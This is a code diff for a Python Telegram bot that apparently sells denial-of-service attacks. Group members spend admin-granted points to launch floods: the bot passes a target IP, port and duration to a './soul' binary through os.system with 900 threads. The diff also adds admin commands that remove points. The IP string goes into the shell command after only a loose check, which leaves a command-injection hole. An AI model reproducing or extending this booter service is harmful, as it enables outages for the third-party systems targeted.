@@ -13,77 +13,62 @@ user_permissions = {}  # Dictionary to store user access status
 user_points = {}  # Store points for each user
 attack_in_progress = False  # Flag to check if an attack is running
 
-# Start command (when a user starts the bot)
-@bot.message_handler(commands=['start'])
-def handle_start(message):
-    user_id = message.from_user.id
-
-    if message.chat.type == 'private':
-        if user_id not in user_points or user_points[user_id] == 0:
-            bot.send_message(message.chat.id, "❗ You can't use this bot until you get points from the admin. Please DM the admin @samy784 to get points.")
-            return
-        else:
-            bot.send_message(message.chat.id, f"🎉 You have {user_points[user_id]} points. To start an attack, send IP, Port, and Duration.\n🙏 Example format: `167.67.25 6296 100`")
-            return
-
-    if user_id not in user_permissions:
-        user_permissions[user_id] = 'approved'
-        user_points[user_id] = 5  # Default 5 points for new users
-        bot.send_message(message.chat.id, f"🎉 You have been granted access! You have {user_points[user_id]} points. To start an attack, send IP, Port, and Duration.\n🙏 Example format: `167.67.25 6296 100`")
-
-# Handle attack command (IP, Port, Duration)
-@bot.message_handler(func=lambda message: user_permissions.get(message.from_user.id) == 'approved')
+# Handle attack command (IP, Port, Duration) directly in group chat
+@bot.message_handler(func=lambda message: True)
 def handle_attack_command(message):
     global attack_in_progress
     user_id = message.from_user.id
+
+    if message.chat.type == 'private':
+        # Ignore private messages unless you want specific functionality here.
+        return
+
+    # Check if the message format is correct (IP Port Duration)
+    parts = message.text.split()
+    if len(parts) != 3:
+        return  # If the message format is not correct, do nothing
+    
+    # Ensure the user has permission (points) to start an attack
+    if user_id not in user_points or user_points[user_id] <= 0:
+        bot.send_message(message.chat.id, f"❗ You have no points left. Please contact the admin @samy784 to get more points.")
+        return
+
+    # Parse message data
+    target_ip, target_port, duration = parts
+    try:
+        target_port = int(target_port)
+        duration = int(duration)
+    except ValueError:
+        return  # If invalid port or duration, do nothing
+
     if attack_in_progress:
         bot.send_message(message.chat.id, "⚠️ An attack is currently in progress. Please try again later.")
         return
 
-    if user_points.get(user_id, 0) == 0:
-        bot.send_message(message.chat.id, "❗ You have no points left. Please contact the admin @samy784 to get more points.")
+    # Check if IP address is valid
+    if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
+        bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
         return
 
-    try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            bot.send_message(message.chat.id, "❗ Please send the correct format: IP Port Duration\nExample: `167.67.25 6296 100`.")
-            return
+    if duration > 100:
+        bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
+        return
 
-        target_ip, target_port, duration = parts
-        target_port = int(target_port)
-        duration = int(duration)
-        
-        # Set the default number of threads to 900
-        threads = 900
+    # Decrease user points before starting the attack
+    user_points[user_id] -= 1
 
-        # Check for valid IP format
-        if not target_ip.replace('.', '').isdigit() or target_ip.count('.') != 3:
-            bot.send_message(message.chat.id, "❗ Invalid IP address format. Please provide a valid IP.")
-            return
+    # Start attack process
+    attack_in_progress = True
+    threads = 900  # Number of threads for attack (default value)
 
-        if duration > 100:
-            bot.send_message(message.chat.id, "❗ The maximum attack duration is 100 seconds. Please provide a shorter duration.")
-            return
+    bot.send_message(message.chat.id, f"🚀 Attack in progress!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
 
-        # Start the attack
-        attack_in_progress = True
-        bot.send_message(message.chat.id, f"🚀 Attack in process!\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds with {threads} threads.")
+    # Execute attack command (replace './soul' with your actual attack command)
+    attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
+    os.system(attack_command)
 
-        # Execute the attack using the `./soul` command
-        attack_command = f"./soul {target_ip} {target_port} {duration} {threads}"
-        os.system(attack_command)
-
-        # Decrease points after attack completion
-        user_points[user_id] -= 1
-        attack_in_progress = False
-        bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")
-
-    except ValueError:
-        bot.send_message(message.chat.id, "❗ Port and Duration must be numeric values. Please provide valid inputs.")
-    except Exception as e:
-        bot.send_message(message.chat.id, "❗ Something went wrong. Please try again later.")
-        attack_in_progress = False
+    attack_in_progress = False
+    bot.send_message(message.chat.id, f"🎉 Attack completed! You now have {user_points[user_id]} points remaining.\nFor more points, please contact the admin @samy784.")
 
 # Admin adds points to a user
 @bot.message_handler(commands=['addpoint'])
@@ -103,6 +88,44 @@ def add_points(message):
         bot.send_message(message.chat.id, f"User {target_user_id} has been granted {points_to_add} points.")
     except (IndexError, ValueError):
         bot.send_message(message.chat.id, "❗ Please provide a valid user ID and points. Example: /addpoint 123456789 10")
+
+# Admin removes points from a user
+@bot.message_handler(commands=['removepoint'])
+def remove_points(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can remove points. Please contact the admin @samy784.")
+        return
+
+    try:
+        target_user_id, points_to_remove = map(int, message.text.split()[1:])
+        if target_user_id in user_points:
+            user_points[target_user_id] -= points_to_remove
+            if user_points[target_user_id] < 0:
+                user_points[target_user_id] = 0  # Ensure points don't go negative
+        else:
+            bot.send_message(message.chat.id, f"❗ User {target_user_id} does not have any points.")
+            return
+        bot.send_message(target_user_id, f"❗ {points_to_remove} points have been removed from your account. You now have {user_points[target_user_id]} points.")
+        bot.send_message(message.chat.id, f"User {target_user_id} has had {points_to_remove} points removed.")
+    except (IndexError, ValueError):
+        bot.send_message(message.chat.id, "❗ Please provide a valid user ID and points to remove. Example: /removepoint 123456789 5")
+
+# Admin removes points from all users in the group
+@bot.message_handler(commands=['removepointall'])
+def remove_points_all(message):
+    user_id = message.from_user.id
+    if user_id != ADMIN_ID:
+        bot.send_message(message.chat.id, "⚠️ You are not an admin! Only the admin can remove points from all users.")
+        return
+
+    # Reset points of all users to 0
+    for user in user_permissions:
+        user_points[user] = 0
+        bot.send_message(user, "❗ Your points have been reset to 0. Please contact the admin @samy784 for more points.")
+    
+    # Confirmation message in the group
+    bot.send_message(message.chat.id, "✅ Points have been reset for all users. All points are now 0.")
 
 # Admin adds points to all users in the group
 @bot.message_handler(commands=['addpointall'])
